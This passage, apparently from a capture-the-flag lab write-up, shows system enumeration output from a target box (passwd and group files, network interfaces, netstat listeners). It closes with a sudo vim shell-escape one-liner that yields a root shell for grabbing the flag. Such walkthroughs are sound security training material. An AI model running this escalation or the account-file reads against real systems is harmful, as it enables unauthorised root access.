systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
sunbath:x:1000:1000:Vuln,,,:/home/sunbath:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:122:130:ftp daemon,,,:/srv/ftp:/bin/false
mitch:x:1001:1001::/home/mitch:
sshd:x:123:65534::/var/run/sshd:/usr/sbin/nologin
```

#### Groups

`sunbath` is a member of the `adm` group.

```bash
mitch@Machine:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,sunbath
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:sunbath
floppy:x:25:
tape:x:26:
sudo:x:27:sunbath
audio:x:29:pulse
dip:x:30:sunbath
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:sunbath
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
input:x:106:
crontab:x:107:
syslog:x:108:
netdev:x:109:
messagebus:x:110:
uuidd:x:111:
ssl-cert:x:112:
lpadmin:x:113:sunbath
lightdm:x:114:
nopasswdlogin:x:115:
ssh:x:116:
whoopsie:x:117:
mlocate:x:118:
avahi-autoipd:x:119:
avahi:x:120:
bluetooth:x:121:
scanner:x:122:saned
colord:x:123:
pulse:x:124:
pulse-access:x:125:
rtkit:x:126:
saned:x:127:
sunbath:x:1000:
sambashare:x:128:sunbath
mysql:x:129:
ftp:x:130:
mitch:x:1001:
```

#### Network Interfaces

```bash
mitch@Machine:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:64:59:38:3b:55 brd ff:ff:ff:ff:ff:ff
    inet 10.10.225.241/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::64:59ff:fe38:3b55/64 scope link
       valid_lft forever preferred_lft forever
```

#### Routing Table

```bash
mitch@Machine:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
10.10.0.0       *               255.255.0.0     U     0      0        0 eth0
link-local      *               255.255.0.0     U     1000   0        0 eth0
```

#### ARP Cache

```bash
mitch@Machine:~$ arp -a
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0
```

#### Network Listeners & Connections

The target is listening on `localhost` TCP ports 3306 (MySQL, presumably for the web application), 6010, and 631.

TCP port 6010 may be related to x11.

TCP port 631 is most likely related to the running CUPS process.

```bash
mitch@Machine:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    288 10.10.225.241:2222      10.6.31.77:49594        ESTABLISHED on (0,18/0/0)
tcp6       0      0 ::1:6010                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::2222                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:631                 :::*                    LISTEN      off (0.00/0/0)
udp        0      0 0.0.0.0:57507           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:631             0.0.0.0:*                           off (0.00/0/0)
udp6       0      0 :::5353                 :::*                                off (0.00/0/0)
udp6       0      0 :::44651                :::*                                off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ]         DGRAM                    23332    /run/user/1001/systemd/notify
unix  2      [ ]         DGRAM                    21931    /run/user/108/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     23333    /run/user/1001/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     21932    /run/user/108/systemd/private
unix  2      [ ACC ]     SEQPACKET  LISTENING     14163    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     22739    /run/user/108/pulse/native
unix  2      [ ACC ]     STREAM     LISTENING     20609    @/tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     22029    @/tmp/dbus-ifgLbv9kzR
unix  2      [ ACC ]     STREAM     LISTENING     20610    /tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     22222    @/tmp/dbus-UODJ70bA2i
unix  2      [ ACC ]     STREAM     LISTENING     22411    @/com/ubuntu/upstart-session/108/1337
unix  2      [ ACC ]     STREAM     LISTENING     17269    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     17270    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     17271    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     17277    /run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     17278    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     17279    /var/run/avahi-daemon/socket
unix  2      [ ACC ]     STREAM     LISTENING     17280    /var/run/cups/cups.sock
unix  3      [ ]         DGRAM                    13866    /run/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     21673    /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     13867    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     13874    /run/systemd/journal/stdout
unix  8      [ ]         DGRAM                    13875    /run/systemd/journal/socket
unix  2      [ ACC ]     STREAM     LISTENING     13882    /run/systemd/fsck.progress
unix  14     [ ]         DGRAM                    14053    /run/systemd/journal/dev-log
unix  2      [ ]         DGRAM                    14164    /run/systemd/journal/syslog
unix  3      [ ]         STREAM     CONNECTED     22880
unix  3      [ ]         STREAM     CONNECTED     22231
unix  3      [ ]         STREAM     CONNECTED     22145
unix  3      [ ]         STREAM     CONNECTED     20825
unix  3      [ ]         STREAM     CONNECTED     23019    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    21923
unix  3      [ ]         STREAM     CONNECTED     22278
unix  3      [ ]         STREAM     CONNECTED     22244
unix  3      [ ]         STREAM     CONNECTED     22874    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22783
unix  3      [ ]         STREAM     CONNECTED     21816
unix  3      [ ]         STREAM     CONNECTED     22999    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22197    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     21907
unix  2      [ ]         DGRAM                    23026
unix  3      [ ]         STREAM     CONNECTED     22242
unix  3      [ ]         STREAM     CONNECTED     21908    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     20025
unix  3      [ ]         STREAM     CONNECTED     22779    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22873
unix  3      [ ]         STREAM     CONNECTED     22261
unix  3      [ ]         STREAM     CONNECTED     21110
unix  3      [ ]         STREAM     CONNECTED     22883
unix  3      [ ]         STREAM     CONNECTED     22238    @/tmp/dbus-UODJ70bA2i
unix  3      [ ]         STREAM     CONNECTED     21150
unix  3      [ ]         STREAM     CONNECTED     22243    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22784    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22262    @/tmp/dbus-ifgLbv9kzR
unix  2      [ ]         DGRAM                    21914
unix  3      [ ]         STREAM     CONNECTED     22237
unix  3      [ ]         STREAM     CONNECTED     21767
unix  3      [ ]         STREAM     CONNECTED     22765
unix  3      [ ]         STREAM     CONNECTED     22229
unix  3      [ ]         STREAM     CONNECTED     23018
unix  3      [ ]         STREAM     CONNECTED     22766    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22868
unix  2      [ ]         DGRAM                    21807
unix  3      [ ]         STREAM     CONNECTED     21111    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22196
unix  3      [ ]         STREAM     CONNECTED     22869    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22232    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22778
unix  3      [ ]         STREAM     CONNECTED     20044    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21817    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22995
unix  3      [ ]         STREAM     CONNECTED     22144
unix  3      [ ]         STREAM     CONNECTED     22881    /run/user/108/pulse/native
unix  3      [ ]         STREAM     CONNECTED     22228
unix  3      [ ]         STREAM     CONNECTED     21777    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     21151    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22885    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     20995    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22456    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     24029
unix  3      [ ]         STREAM     CONNECTED     18652    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18531
unix  3      [ ]         STREAM     CONNECTED     22493    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22504    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18117
unix  3      [ ]         STREAM     CONNECTED     15795
unix  3      [ ]         DGRAM                    15949
unix  3      [ ]         STREAM     CONNECTED     22450    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22339    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22492
unix  3      [ ]         STREAM     CONNECTED     17341
unix  3      [ ]         STREAM     CONNECTED     22273
unix  3      [ ]         STREAM     CONNECTED     22351    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     17286
unix  3      [ ]         STREAM     CONNECTED     14524
unix  3      [ ]         DGRAM                    15948
unix  3      [ ]         STREAM     CONNECTED     22501
unix  3      [ ]         STREAM     CONNECTED     22274    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22446    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22331
unix  3      [ ]         STREAM     CONNECTED     15797    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    14667
unix  3      [ ]         STREAM     CONNECTED     22444    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22334    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    16971
unix  3      [ ]         STREAM     CONNECTED     22443
unix  3      [ ]         STREAM     CONNECTED     17938    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    15944
unix  3      [ ]         STREAM     CONNECTED     22483    @/tmp/dbus-ifgLbv9kzR
unix  2      [ ]         STREAM     CONNECTED     24031
unix  3      [ ]         STREAM     CONNECTED     22350
unix  3      [ ]         STREAM     CONNECTED     22455
unix  2      [ ]         DGRAM                    14613
unix  3      [ ]         STREAM     CONNECTED     22485    /var/run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    15951
unix  3      [ ]         STREAM     CONNECTED     17375    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22445
unix  3      [ ]         STREAM     CONNECTED     17937
unix  3      [ ]         STREAM     CONNECTED     19520    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     24030    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22502    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22338
unix  3      [ ]         STREAM     CONNECTED     22484
unix  3      [ ]         STREAM     CONNECTED     18162    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18053
unix  2      [ ]         DGRAM                    17749
unix  3      [ ]         STREAM     CONNECTED     22449
unix  3      [ ]         STREAM     CONNECTED     22335    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    15950
unix  3      [ ]         STREAM     CONNECTED     22503
unix  3      [ ]         STREAM     CONNECTED     14540    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19313
unix  3      [ ]         STREAM     CONNECTED     17343    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22482
unix  3      [ ]         STREAM     CONNECTED     19516
unix  3      [ ]         STREAM     CONNECTED     19315    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22528    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22563
unix  3      [ ]         STREAM     CONNECTED     22761    @/tmp/dbus-UODJ70bA2i
unix  3      [ ]         STREAM     CONNECTED     22535
unix  3      [ ]         STREAM     CONNECTED     22259
unix  3      [ ]         STREAM     CONNECTED     22737    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22524    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22245    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18691
unix  3      [ ]         STREAM     CONNECTED     22251
unix  3      [ ]         STREAM     CONNECTED     22749    /run/user/108/pulse/native
unix  3      [ ]         STREAM     CONNECTED     22752
unix  3      [ ]         STREAM     CONNECTED     22698
unix  3      [ ]         STREAM     CONNECTED     22736
unix  3      [ ]         STREAM     CONNECTED     22260    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22762
unix  3      [ ]         STREAM     CONNECTED     22252    @/tmp/dbus-UODJ70bA2i
unix  3      [ ]         STREAM     CONNECTED     22751    @/tmp/dbus-UODJ70bA2i
unix  3      [ ]         STREAM     CONNECTED     22523
unix  3      [ ]         STREAM     CONNECTED     22657
unix  3      [ ]         STREAM     CONNECTED     22744
unix  3      [ ]         STREAM     CONNECTED     22699    @/tmp/dbus-UODJ70bA2i
unix  3      [ ]         STREAM     CONNECTED     22747    /run/user/108/pulse/native
unix  3      [ ]         DGRAM                    22574
unix  3      [ ]         STREAM     CONNECTED     18928    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22701
unix  2      [ ]         DGRAM                    18669
unix  3      [ ]         STREAM     CONNECTED     22756    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22748
unix  3      [ ]         STREAM     CONNECTED     18692    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22537    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     18927
unix  3      [ ]         STREAM     CONNECTED     22760
unix  3      [ ]         STREAM     CONNECTED     22733
unix  3      [ ]         STREAM     CONNECTED     22530    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22763    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22753    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22732    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22564    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     19471
unix  3      [ ]         STREAM     CONNECTED     22697    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22755
unix  3      [ ]         STREAM     CONNECTED     22529
unix  3      [ ]         STREAM     CONNECTED     22743    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     22750
unix  2      [ ]         DGRAM                    18924
unix  3      [ ]         STREAM     CONNECTED     22742
unix  3      [ ]         STREAM     CONNECTED     19472    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22734    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22527
unix  3      [ ]         STREAM     CONNECTED     22731
unix  3      [ ]         STREAM     CONNECTED     22702    @/tmp/.X11-unix/X0
unix  3      [ ]         DGRAM                    22573
unix  3      [ ]         STREAM     CONNECTED     18690    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18413
unix  3      [ ]         STREAM     CONNECTED     24015    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22412
unix  3      [ ]         STREAM     CONNECTED     20361    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     24014
unix  3      [ ]         STREAM     CONNECTED     22283
unix  3      [ ]         STREAM     CONNECTED     18412
unix  3      [ ]         STREAM     CONNECTED     24025
unix  3      [ ]         STREAM     CONNECTED     19638
unix  3      [ ]         STREAM     CONNECTED     22284    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     24026    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18475
unix  3      [ ]         STREAM     CONNECTED     18403    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     19639    /run/systemd/journal/stdout
unix  2      [ ]         STREAM     CONNECTED     24012
unix  3      [ ]         STREAM     CONNECTED     18661    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22413    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    17370
unix  3      [ ]         STREAM     CONNECTED     20621    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22281    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    23218
unix  3      [ ]         STREAM     CONNECTED     17373
unix  3      [ ]         STREAM     CONNECTED     22321
unix  3      [ ]         STREAM     CONNECTED     22332
unix  3      [ ]         STREAM     CONNECTED     18226
unix  2      [ ]         DGRAM                    23315
unix  3      [ ]         STREAM     CONNECTED     17374
unix  3      [ ]         STREAM     CONNECTED     23388
unix  2      [ ]         DGRAM                    14293
unix  3      [ ]         STREAM     CONNECTED     24005    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    22375
unix  3      [ ]         STREAM     CONNECTED     24004
unix  3      [ ]         STREAM     CONNECTED     22280
unix  2      [ ]         DGRAM                    23324
unix  2      [ ]         DGRAM                    18227
unix  3      [ ]         DGRAM                    15267
unix  3      [ ]         STREAM     CONNECTED     23922
unix  2      [ ]         DGRAM                    18410
unix  3      [ ]         STREAM     CONNECTED     18402
unix  3      [ ]         STREAM     CONNECTED     20360
unix  3      [ ]         STREAM     CONNECTED     23307
unix  3      [ ]         STREAM     CONNECTED     22279    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18283
unix  3      [ ]         STREAM     CONNECTED     23923    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    15266
unix  3      [ ]         STREAM     CONNECTED     23387
unix  3      [ ]         STREAM     CONNECTED     22322    @/tmp/dbus-ifgLbv9kzR
unix  3      [ ]         STREAM     CONNECTED     18653    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     23311    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18741    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     20620
```

---

## `sudo` Shell Escape to `root`

`mitch` can execute `vim` as `root` without a password. An elevated shell can be spawned from within `vim` using the `sudo` shell escape specified on [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo). From the `root` shell, grab the system flag at `/root/root.txt`.

```bash
mitch@Machine:~$ sudo vim -c ':!/bin/bash'
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
```
